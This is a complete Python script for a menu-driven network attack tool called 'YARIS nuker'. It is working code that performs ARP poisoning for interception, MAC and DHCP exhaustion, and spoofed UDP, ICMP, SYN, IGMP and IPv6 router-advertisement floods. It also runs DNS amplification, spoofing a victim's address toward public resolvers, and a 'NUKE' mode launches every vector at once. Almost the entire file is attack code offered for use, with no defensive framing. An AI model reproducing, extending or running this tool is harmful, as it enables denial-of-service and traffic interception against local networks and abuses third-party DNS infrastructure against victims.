#!/usr/bin/env python3
# YARIS nuker v3.1  —  raw socket edition, full rewrite
# target: linux (root)
# deps: pip install --user --upgrade scapy   (scan + dns amp + ra only)
#
# menu:
#   [1]  scan          arp sweep + gateway
#   [2]  arp poison    bidirectional, pairwise
#   [3]  arp storm     broadcast gratuitous, segment-wide
#   [4]  mac flood     cam table exhaustion
#   [5]  dhcp starve   raw bootp+dhcp
#   [6]  flood         udp/icmp/dns, spoofed src
#   [7]  syn flood     spoofed src, gateway syn backlog
#   [8]  dns amp       open resolvers, spoofed victim
#   [9]  ra flood      ipv6 router advertisement
#   [10] igmp flood    random multicast groups
#   [11] NUKE          all of it
#   [12] status        live counters
#   [0]  cleanup+exit  restore arp, heal network
#
# ctrl+c wired to cleanup.

import os
import sys
import time
import random
import signal
import socket
import struct
import argparse
import threading
from collections import defaultdict

try:
    from scapy.all import (
        ARP, Ether, IP, UDP, DNS, DNSQR,
        IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo,
        srp, send, get_if_hwaddr, get_if_addr, conf,
    )
except ImportError:
    print("[!] scapy missing. run: pip install --user --upgrade scapy")
    sys.exit(1)

conf.verb = 0

BANNER = r"""
  ██╗   ██╗ █████╗ ██████╗ ██╗███████╗
  ╚██╗ ██╔╝██╔══██╗██╔══██╗██║██╔════╝
   ╚████╔╝ ███████║██████╔╝██║███████╗
    ╚██╔╝  ██╔══██║██╔══██╗██║╚════██║
     ██║   ██║  ██║██║  ██║██║███████║
     ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚══════╝
        nuker v3.1  —  raw socket edition
"""

DNS_RESOLVERS = [
    "1.1.1.1", "8.8.8.8", "8.8.4.4", "9.9.9.9",
    "208.67.222.222", "208.67.220.220", "1.0.0.1",
    "64.6.64.6", "77.88.8.8", "77.88.8.1",
    "156.154.70.1", "156.154.71.1",
]

DNS_AMP_QUERIES = [
    "isc.org", "ripe.net", "arin.net", "cloudflare.com",
    "google.com", "microsoft.com", "iana.org", "icann.org",
]

BROADCAST_MAC = b"\xff\xff\xff\xff\xff\xff"


# ─────────────── packet builders ───────────────
def csum(data):
    if len(data) % 2:
        data += b"\x00"
    s = 0
    for i in range(0, len(data), 2):
        s += (data[i] << 8) | data[i + 1]
    s = (s >> 16) + (s & 0xFFFF)
    s += s >> 16
    return (~s) & 0xFFFF


def mac_bytes(mac):
    return bytes.fromhex(mac.replace(":", ""))


def ip_bytes(ip):
    return socket.inet_aton(ip)


def eth_hdr(dst_mac, src_mac, ethertype):
    return dst_mac + src_mac + struct.pack("!H", ethertype)


def ipv4_hdr(src, dst, proto, payload, ttl=64, ident=None, flags=0):
    if ident is None:
        ident = random.randint(0, 0xFFFF)
    total = 20 + len(payload)
    ver_ihl = (4 << 4) | 5
    hdr0 = struct.pack(
        "!BBHHHBBH4s4s",
        ver_ihl, 0, total, ident, flags,
        ttl, proto, 0,
        ip_bytes(src), ip_bytes(dst),
    )
    c = csum(hdr0)
    hdr = struct.pack(
        "!BBHHHBBH4s4s",
        ver_ihl, 0, total, ident, flags,
        ttl, proto, c,
        ip_bytes(src), ip_bytes(dst),
    )
    return hdr + payload


def udp_hdr(sport, dport, payload):
    length = 8 + len(payload)
    return struct.pack("!HHHH", sport, dport, length, 0) + payload


def tcp_syn(src_ip, dst_ip, sport, dport, seq):
    data_off = (5 << 4)
    hdr0 = struct.pack(
        "!HHIIBBHHH",
        sport, dport, seq, 0,
        data_off, 0x02, 65535, 0, 0,
    )
    pseudo = ip_bytes(src_ip) + ip_bytes(dst_ip) + struct.pack("!BBH", 0, 6, len(hdr0))
    c = csum(pseudo + hdr0)
    return struct.pack(
        "!HHIIBBHHH",
        sport, dport, seq, 0,
        data_off, 0x02, 65535, c, 0,
    )


def arp_frame(op, src_mac, src_ip, dst_mac, dst_ip):
    arp = struct.pack(
        "!HHBBH6s4s6s4s",
        1, 0x0800, 6, 4, op,
        src_mac, ip_bytes(src_ip),
        dst_mac, ip_bytes(dst_ip),
    )
    return eth_hdr(dst_mac, src_mac, 0x0806) + arp


def bootp_dhcp_discover(chaddr_mac_bytes, xid):
    bootp = struct.pack(
        "!BBBBIHH4s4s4s4s16s64s128s",
        1, 1, 6, 0, xid, 0, 0x8000,
        b"\x00" * 4, b"\x00" * 4, b"\x00" * 4, b"\x00" * 4,
        chaddr_mac_bytes + b"\x00" * 10,
        b"\x00" * 64,
        b"\x00" * 128,
    )
    magic = b"\x63\x82\x53\x63"
    opts = b""
    opts += bytes([53, 1, 1])
    opts += bytes([55, 4, 1, 3, 6, 15])
    opts += bytes([60, 8]) + b"MSFT 5.0"
    opts += bytes([61, 7, 1]) + chaddr_mac_bytes
    opts += bytes([12, 8]) + b"yaris\x00\x00\x00"
    opts += bytes([255])
    return bootp + magic + opts


class RawEngine:
    def __init__(self, iface):
        self.iface = iface
        self.sock = socket.socket(
            socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0003)
        )
        self.sock.bind((iface, 0))
        try:
            self.sock.setsockopt(socket.SOL_PACKET, socket.PACKET_QDISC_BYPASS, 1)
        except Exception:
            pass

    def send(self, frame):
        try:
            self.sock.send(frame)
        except Exception:
            pass


class Yaris:
    def __init__(self, iface=None, dry=False, threads=16):
        self.iface = iface
        self.dry = dry
        self.threads_n = threads
        self.our_mac = None
        self.our_ip = None
        self.our_ip6 = None
        self.gateway_ip = None
        self.gateway_mac = None
        self.subnet = None
        self.hosts = []
        self.poisoned = []
        self.stop = threading.Event()
        self.threads = []
        self.lock = threading.Lock()
        self.stats = defaultdict(int)
        self.running = {
            "arp": False, "arpstorm": False, "macflood": False,
            "dhcp": False, "flood": False, "syn": False,
            "dns": False, "ra": False, "igmp": False,
        }
        self.engine = None
        self._reporter = None

    # ─── setup ───
    def detect(self):
        iface = self.iface or conf.route.route("0.0.0.0")[0]
        self.iface = iface
        self.our_ip = get_if_addr(iface)
        self.our_mac = get_if_hwaddr(iface)
        self.gateway_ip = conf.route.route("0.0.0.0")[2]

        if self.gateway_ip in ("0.0.0.0", "", None):
            print("[!] no default route")
            sys.exit(1)

        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.gateway_ip),
            iface=iface, timeout=2, verbose=0,
        )
        self.gateway_mac = ans[0][1].hwsrc if ans else None

        parts = self.our_ip.split(".")
        if len(parts) == 4:
            self.subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"

        try:
            from scapy.all import get_if_addr6
            self.our_ip6 = get_if_addr6(iface)
        except Exception:
            self.our_ip6 = None

        try:
            self.engine = RawEngine(iface)
        except PermissionError:
            print("[!] raw socket failed — need root / CAP_NET_RAW")
            sys.exit(1)
        except Exception as e:
            print(f"[!] raw engine failed: {e}")
            sys.exit(1)

    # ─── stats ───
    def _bump(self, key, n=1):
        with self.lock:
            self.stats[key] += n

    def _reporter_loop(self):
        last = defaultdict(int)
        while not self.stop.is_set():
            time.sleep(1.0)
            with self.lock:
                snap = dict(self.stats)
            deltas = {k: snap[k] - last.get(k, 0) for k in snap}
            last = snap
            total = sum(snap.values())
            pps = sum(deltas.values())
            active = ",".join(k for k, v in self.running.items() if v) or "-"
            sys.stdout.write(
                f"\r  [stats] total={total:<12} pps={pps:>9}  active=[{active}]   "
            )
            sys.stdout.flush()

    def start_reporter(self):
        if self._reporter and self._reporter.is_alive():
            return
        self._reporter = threading.Thread(target=self._reporter_loop, daemon=True)
        self._reporter.start()

    # ─── scan ───
    def scan(self, subnet=None):
        subnet = subnet or self.subnet
        print(f"\n  scanning {subnet} ...")
        ans, _ = srp(
            Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=subnet),
            iface=self.iface, timeout=3, verbose=0,
        )
        hosts = [(r.psrc, r.hwsrc) for _, r in ans]
        hosts.sort(key=lambda x: tuple(int(o) for o in x[0].split(".")))
        self.hosts = hosts
        print(f"  found {len(hosts)} host(s):")
        for ip, mac in hosts:
            tag = ""
            if ip == self.our_ip:
                tag = " (us)"
            elif ip == self.gateway_ip:
                tag = " (gateway)"
            print(f"    {ip:<16} {mac}{tag}")

    # ─── ARP poison (raw, pairwise) ───
    def arp_poison(self, targets):
        if not self.gateway_mac:
            print("  [!] no gateway mac")
            return
        if not targets:
            print("  [!] no targets")
            return

        print(f"\n  arp poison — {len(targets)} target(s)")
        self.running["arp"] = True
        self.start_reporter()

        our = mac_bytes(self.our_mac)
        gw_mac = mac_bytes(self.gateway_mac)
        gw_ip = self.gateway_ip

        def worker():
            frames_to = []
            frames_from = []
            for t_ip, t_mac in targets:
                t_m = mac_bytes(t_mac)
                frames_to.append(arp_frame(2, our, gw_ip, t_m, t_ip))
                frames_from.append(arp_frame(2, our, t_ip, gw_mac, gw_ip))

            while self.running["arp"] and not self.stop.is_set():
                if not self.dry:
                    for f in frames_to:
                        self.engine.send(f)
                    for f in frames_from:
                        self.engine.send(f)
                self._bump("arp", len(frames_to) + len(frames_from))
                time.sleep(0.3)

            print("\n  [arp] restoring...")
            for t_ip, t_mac in targets:
                t_m = mac_bytes(t_mac)
                restore_to = arp_frame(2, gw_mac, gw_ip, t_m, t_ip)
                restore_from = arp_frame(2, t_m, t_ip, gw_mac, gw_ip)
                for _ in range(5):
                    self.engine.send(restore_to)
                    self.engine.send(restore_from)
                    time.sleep(0.05)
            print("  [arp] restored")

        t = threading.Thread(target=worker, daemon=True)
        t.start()
        self.threads.append(t)
        self.poisoned = list(targets)

    def arp_targets_all(self):
        return [(ip, mac) for ip, mac in self.hosts
                if ip not in (self.our_ip, self.gateway_ip)]

    # ─── ARP storm ───
    def arp_storm(self, count=512):
        if not self.gateway_mac:
            print("  [!] no gateway mac")
            return
        print(f"\n  arp storm — broadcast gratuitous, {count} pool")
        self.running["arpstorm"] = True
        self.start_reporter()

        our = mac_bytes(self.our_mac)
        pool = []
        for _ in range(count):
            pool.append(arp_frame(2, our, self.gateway_ip, BROADCAST_MAC, self.gateway_ip))
        for _ in range(count):
            fake_ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            pool.append(arp_frame(2, our, fake_ip, BROADCAST_MAC, fake_ip))

        def worker():
            random.shuffle(pool)
            i = 0
            while self.running["arpstorm"] and not self.stop.is_set():
                if not self.dry:
                    self.engine.send(pool[i])
                i = (i + 1) % len(pool)
                self._bump("arpstorm")
                if i == 0:
                    random.shuffle(pool)

        for _ in range(self.threads_n):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)

        def waiter():
            while self.running["arpstorm"] and not self.stop.is_set():
                time.sleep(0.3)
            print("\n  [arpstorm] stopped")
        threading.Thread(target=waiter, daemon=True).start()

    # ─── MAC flood ───
    def mac_flood(self, count=4096):
        print(f"\n  mac flood — cam table exhaustion, {count} pool")
        self.running["macflood"] = True
        self.start_reporter()

        pool = []
        for _ in range(count):
            src = bytes([0x02] + [random.randint(0, 255) for _ in range(5)])
            etype = random.choice([0x0800, 0x0806, 0x86DD, 0x8100])
            payload = os.urandom(46)
            pool.append(eth_hdr(BROADCAST_MAC, src, etype) + payload)

        def worker():
            i = 0
            while self.running["macflood"] and not self.stop.is_set():
                if not self.dry:
                    self.engine.send(pool[i])
                i = (i + 1) % len(pool)
                self._bump("macflood")
                if i == 0:
                    random.shuffle(pool)

        for _ in range(self.threads_n):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)

        def waiter():
            while self.running["macflood"] and not self.stop.is_set():
                time.sleep(0.3)
            print("\n  [macflood] stopped")
        threading.Thread(target=waiter, daemon=True).start()

    # ─── DHCP starve ───
    def dhcp_starve(self, count=2048):
        print(f"\n  dhcp starve — raw bootp+dhcp, {count} pool")
        self.running["dhcp"] = True
        self.start_reporter()

        pool = []
        for _ in range(count):
            chaddr = bytes([0x02] + [random.randint(0, 255) for _ in range(5)])
            xid = random.randint(0, 0xFFFFFFFF)
            bootp = bootp_dhcp_discover(chaddr, xid)
            udp = udp_hdr(68, 67, bootp)
            ip_ = ipv4_hdr("0.0.0.0", "255.255.255.255", 17, udp, ttl=64, flags=0)
            frame = eth_hdr(BROADCAST_MAC, chaddr, 0x0800) + ip_
            pool.append(frame)

        def worker():
            i = 0
            while self.running["dhcp"] and not self.stop.is_set():
                if not self.dry:
                    self.engine.send(pool[i])
                i = (i + 1) % len(pool)
                self._bump("dhcp")
                if i == 0:
                    random.shuffle(pool)

        for _ in range(self.threads_n):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)

        def waiter():
            while self.running["dhcp"] and not self.stop.is_set():
                time.sleep(0.3)
            print("\n  [dhcp] stopped")
        threading.Thread(target=waiter, daemon=True).start()

    # ─── flood (udp/icmp/dns, spoofed) ───
    def flood(self, count=4096):
        print(f"\n  flood — udp/icmp/dns, spoofed src, {count} pool")
        self.running["flood"] = True
        self.start_reporter()

        our = mac_bytes(self.our_mac)

        udp_pool = []
        icmp_pool = []
        dns_pool = []

        for _ in range(count):
            src = f"{random.choice([10,172,192])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            dst = random.choice(DNS_RESOLVERS)

            sport = random.randint(1024, 65535)
            dport = random.randint(1, 65535)
            payload = os.urandom(random.choice([1200, 1400, 1472]))
            udp = udp_hdr(sport, dport, payload)
            ip_ = ipv4_hdr(src, dst, 17, udp)
            udp_pool.append(eth_hdr(BROADCAST_MAC, our, 0x0800) + ip_)

            icmp_body = struct.pack(
                "!BBHHH", 8, 0, 0, random.randint(0, 0xFFFF), 1
            ) + os.urandom(1400)
            ip_ = ipv4_hdr(src, dst, 1, icmp_body)
            icmp_pool.append(eth_hdr(BROADCAST_MAC, our, 0x0800) + ip_)

            qname = f"{random.randint(0,0xFFFFFFFF):08x}.{random.choice(DNS_AMP_QUERIES)}"
            dns = struct.pack("!HHHHHH", random.randint(0, 0xFFFF), 0x0100, 1, 0, 0, 0)
            for label in qname.split("."):
                dns += bytes([len(label)]) + label.encode()
            dns += b"\x00" + struct.pack("!HH", 1, 1)
            udp = udp_hdr(random.randint(1024, 65535), 53, dns)
            ip_ = ipv4_hdr(src, dst, 17, udp)
            dns_pool.append(eth_hdr(BROADCAST_MAC, our, 0x0800) + ip_)

        pools = [udp_pool, icmp_pool, dns_pool]
        weights = [50, 20, 30]

        def pick_pool():
            r = random.uniform(0, sum(weights))
            upto = 0
            for p, w in zip(pools, weights):
                upto += w
                if r <= upto:
                    return p
            return udp_pool

        def worker():
            while self.running["flood"] and not self.stop.is_set():
                p = pick_pool()
                i = random.randint(0, len(p) - 1)
                if not self.dry:
                    self.engine.send(p[i])
                self._bump("flood")

        for _ in range(self.threads_n):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)

        def waiter():
            while self.running["flood"] and not self.stop.is_set():
                time.sleep(0.3)
            print("\n  [flood] stopped")
        threading.Thread(target=waiter, daemon=True).start()

    # ─── SYN flood ───
    def syn_flood(self, count=4096, target=None):
        target = target or self.gateway_ip
        print(f"\n  syn flood — target {target}, spoofed src, {count} pool")
        self.running["syn"] = True
        self.start_reporter()

        our = mac_bytes(self.our_mac)
        ports = [80, 443, 22, 53, 8080, 8443, 25, 110, 143, 3306, 3389]

        pool = []
        for _ in range(count):
            src = f"{random.choice([10,172,192])}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            sport = random.randint(1024, 65535)
            dport = random.choice(ports)
            seq = random.randint(0, 0xFFFFFFFF)
            tcp = tcp_syn(src, target, sport, dport, seq)
            ip_ = ipv4_hdr(src, target, 6, tcp)
            pool.append(eth_hdr(BROADCAST_MAC, our, 0x0800) + ip_)

        def worker():
            i = 0
            while self.running["syn"] and not self.stop.is_set():
                if not self.dry:
                    self.engine.send(pool[i])
                i = (i + 1) % len(pool)
                self._bump("syn")
                if i == 0:
                    random.shuffle(pool)

        for _ in range(self.threads_n):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)

        def waiter():
            while self.running["syn"] and not self.stop.is_set():
                time.sleep(0.3)
            print("\n  [syn] stopped")
        threading.Thread(target=waiter, daemon=True).start()

    # ─── DNS amp ───
    def dns_amp(self, victim=None, resolvers=None):
        victim = victim or self.gateway_ip
        resolvers = resolvers or DNS_RESOLVERS
        print(f"\n  dns amp — spoofing src {victim} to {len(resolvers)} resolvers")
        self.running["dns"] = True
        self.start_reporter()

        def worker():
            while self.running["dns"] and not self.stop.is_set():
                r = random.choice(resolvers)
                qname = random.choice(DNS_AMP_QUERIES)
                try:
                    pkt = (
                        IP(src=victim, dst=r) /
                        UDP(sport=random.randint(1024, 65535), dport=53) /
                        DNS(rd=1, qd=DNSQR(qname=qname, qtype="ANY"))
                    )
                    if not self.dry:
                        send(pkt, iface=self.iface, verbose=0)
                    self._bump("dns")
                except Exception:
                    pass

        for _ in range(4):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)

        def waiter():
            while self.running["dns"] and not self.stop.is_set():
                time.sleep(0.3)
            print("\n  [dns] stopped")
        threading.Thread(target=waiter, daemon=True).start()

    # ─── RA flood ───
    def ra_flood(self):
        if not self.our_ip6:
            print("  [!] no ipv6 link-local")
            return
        print(f"\n  ra flood — src {self.our_ip6}")
        self.running["ra"] = True
        self.start_reporter()

        def worker():
            while self.running["ra"] and not self.stop.is_set():
                try:
                    prefix = f"{random.randint(0,0xFFFF):x}:{random.randint(0,0xFFFF):x}::"
                    pkt = (
                        Ether(dst="33:33:00:00:00:01") /
                        IPv6(src=self.our_ip6, dst="ff02::1") /
                        ICMPv6ND_RA(
                            chlim=64, M=1, O=1,
                            routerlifetime=random.randint(1, 9000),
                            reachabletime=random.randint(0, 0xFFFFFFFF),
                            retranstimer=random.randint(0, 0xFFFFFFFF),
                        ) /
                        ICMPv6NDOptPrefixInfo(
                            prefixlen=64, L=1, A=1,
                            validlifetime=random.randint(100, 0xFFFFFFFF),
                            preferredlifetime=random.randint(100, 0xFFFFFFFF),
                            prefix=prefix,
                        )
                    )
                    if not self.dry:
                        send(pkt, iface=self.iface, verbose=0)
                    self._bump("ra")
                except Exception:
                    pass

        for _ in range(4):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)

        def waiter():
            while self.running["ra"] and not self.stop.is_set():
                time.sleep(0.3)
            print("\n  [ra] stopped")
        threading.Thread(target=waiter, daemon=True).start()

    # ─── IGMP flood ───
    def igmp_flood(self, count=1024):
        print(f"\n  igmp flood — random multicast groups, {count} pool")
        self.running["igmp"] = True
        self.start_reporter()

        our = mac_bytes(self.our_mac)
        pool = []
        for _ in range(count):
            group = f"239.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
            igmp0 = struct.pack("!BBH4s", 0x16, 0, 0, ip_bytes(group))
            c = csum(igmp0)
            igmp = struct.pack("!BBH4s", 0x16, 0, c, ip_bytes(group))
            ip_ = ipv4_hdr(self.our_ip, "224.0.0.1", 2, igmp, ttl=1)
            g = ip_bytes(group)
            dst_mac = bytes([0x01, 0x00, 0x5E, g[1] & 0x7F, g[2], g[3]])
            pool.append(eth_hdr(dst_mac, our, 0x0800) + ip_)

        def worker():
            i = 0
            while self.running["igmp"] and not self.stop.is_set():
                if not self.dry:
                    self.engine.send(pool[i])
                i = (i + 1) % len(pool)
                self._bump("igmp")
                if i == 0:
                    random.shuffle(pool)

        for _ in range(self.threads_n):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            self.threads.append(t)

        def waiter():
            while self.running["igmp"] and not self.stop.is_set():
                time.sleep(0.3)
            print("\n  [igmp] stopped")
        threading.Thread(target=waiter, daemon=True).start()

    # ─── NUKE ───
    def nuke(self):
        if not self.hosts:
            print("  scanning first...")
            self.scan()
        targets = self.arp_targets_all()
        print("\n  === NUKE ===  all vectors")
        self.arp_poison(targets)
        time.sleep(0.3)
        self.arp_storm()
        time.sleep(0.3)
        self.mac_flood()
        time.sleep(0.3)
        self.dhcp_starve()
        time.sleep(0.3)
        self.flood()
        time.sleep(0.3)
        self.syn_flood()
        time.sleep(0.3)
        self.dns_amp()
        time.sleep(0.3)
        self.igmp_flood()
        time.sleep(0.3)
        self.ra_flood()
        print("\n  all vectors live. [0] to stop.\n")

    # ─── status ───
    def status(self):
        with self.lock:
            snap = dict(self.stats)
        print("\n  --- status ---")
        print(f"  iface:    {self.iface}")
        print(f"  our ip:   {self.our_ip}  ({self.our_mac})")
        print(f"  gateway:  {self.gateway_ip}  ({self.gateway_mac})")
        print(f"  subnet:   {self.subnet}")
        print(f"  hosts:    {len(self.hosts)}")
        print(f"  poisoned: {len(self.poisoned)}")
        print(f"  active:   {[k for k, v in self.running.items() if v]}")
        print("  packets:")
        for k, v in sorted(snap.items()):
            print(f"    {k:<10} {v}")
        print(f"  total:    {sum(snap.values())}")
        print()

    # ─── cleanup ───
    def cleanup(self):
        print("\n[!] cleanup — stopping all vectors")
        for k in self.running:
            self.running[k] = False
        self.stop.set()
        time.sleep(1.0)

        if self.poisoned and self.gateway_mac and self.engine:
            print("[!] restoring arp...")
            gw_mac = mac_bytes(self.gateway_mac)
            gw_ip = self.gateway_ip
            for t_ip, t_mac in self.poisoned:
                t_m = mac_bytes(t_mac)
                restore_to = arp_frame(2, gw_mac, gw_ip, t_m, t_ip)
                restore_from = arp_frame(2, t_m, t_ip, gw_mac, gw_ip)
                for _ in range(5):
                    try:
                        self.engine.send(restore_to)
                        self.engine.send(restore_from)
                    except Exception:
                        pass
                    time.sleep(0.05)

        if self.gateway_mac and self.engine:
            gw_mac = mac_bytes(self.gateway_mac)
            fix = arp_frame(2, gw_mac, self.gateway_ip, BROADCAST_MAC, self.gateway_ip)
            for _ in range(5):
                try:
                    self.engine.send(fix)
                except Exception:
                    pass
                time.sleep(0.05)

        print("[+] network healed. vroom out.")
        sys.exit(0)

    # ─── menu ───
    def menu(self):
        print(f"\n{'=' * 60}")
        print(f"  YARIS nuker v3.1  |  {self.iface}  |  gw {self.gateway_ip}")
        print(f"{'=' * 60}")
        print("  [1]  scan          arp sweep + gateway")
        print("  [2]  arp poison    bidirectional, pairwise")
        print("  [3]  arp storm     broadcast gratuitous, segment-wide")
        print("  [4]  mac flood     cam table exhaustion")
        print("  [5]  dhcp starve   raw bootp+dhcp")
        print("  [6]  flood         udp/icmp/dns, spoofed src")
        print("  [7]  syn flood     spoofed src, gateway syn backlog")
        print("  [8]  dns amp       open resolvers, spoofed victim")
        print("  [9]  ra flood      ipv6 router advertisement")
        print("  [10] igmp flood    random multicast groups")
        print("  [11] NUKE          all of it")
        print("  [12] status        live counters")
        print("  [0]  cleanup+exit")
        return input("\n  > ").strip()

    def run(self):
        while True:
            try:
                c = self.menu()
            except (EOFError, KeyboardInterrupt):
                self.cleanup()
                return

            if c == "1":
                self.scan()
            elif c == "2":
                if not self.hosts:
                    print("  run scan first")
                    continue
                self.arp_poison(self.arp_targets_all())
            elif c == "3":
                self.arp_storm()
            elif c == "4":
                self.mac_flood()
            elif c == "5":
                self.dhcp_starve()
            elif c == "6":
                self.flood()
            elif c == "7":
                self.syn_flood()
            elif c == "8":
                self.dns_amp()
            elif c == "9":
                self.ra_flood()
            elif c == "10":
                self.igmp_flood()
            elif c == "11":
                self.nuke()
            elif c == "12":
                self.status()
            elif c == "0":
                self.cleanup()
            else:
                print("  unknown")


def parse_args():
    p = argparse.ArgumentParser(
        prog="yaris",
        description="YARIS nuker v3.1 — raw socket edition",
    )
    p.add_argument("-i", "--iface", help="interface (auto if omitted)")
    p.add_argument("--dry", action="store_true",
                   help="dry run — send nothing")
    p.add_argument("--threads", type=int, default=16,
                   help="worker threads per vector (default 16)")
    p.add_argument("--auto-scan", action="store_true",
                   help="scan immediately on start")
    p.add_argument("--nuke", action="store_true",
                   help="skip menu, run all vectors")
    return p.parse_args()


def main():
    if os.geteuid() != 0:
        print("[!] run as root: sudo python3 yaris.py")
        sys.exit(1)

    print(BANNER)
    args = parse_args()

    y = Yaris(iface=args.iface, dry=args.dry, threads=args.threads)
    y.detect()

    print(f"  iface:    {y.iface}")
    print(f"  our ip:   {y.our_ip}  ({y.our_mac})")
    print(f"  gateway:  {y.gateway_ip}  ({y.gateway_mac or 'unknown'})")
    print(f"  subnet:   {y.subnet}")
    if y.our_ip6:
        print(f"  ipv6 ll:  {y.our_ip6}")
    print(f"  threads:  {y.threads_n}")
    if y.dry:
        print("  [dry run — no packets will be sent]")

    signal.signal(signal.SIGINT, lambda *_: y.cleanup())
    signal.signal(signal.SIGTERM, lambda *_: y.cleanup())

    if args.auto_scan:
        y.scan()

    if args.nuke:
        y.nuke()
        print("\n  running. ctrl+c to stop.\n")
        try:
            while True:
                time.sleep(1)
        except KeyboardInterrupt:
            y.cleanup()
    else:
        y.run()


if __name__ == "__main__":
    main()
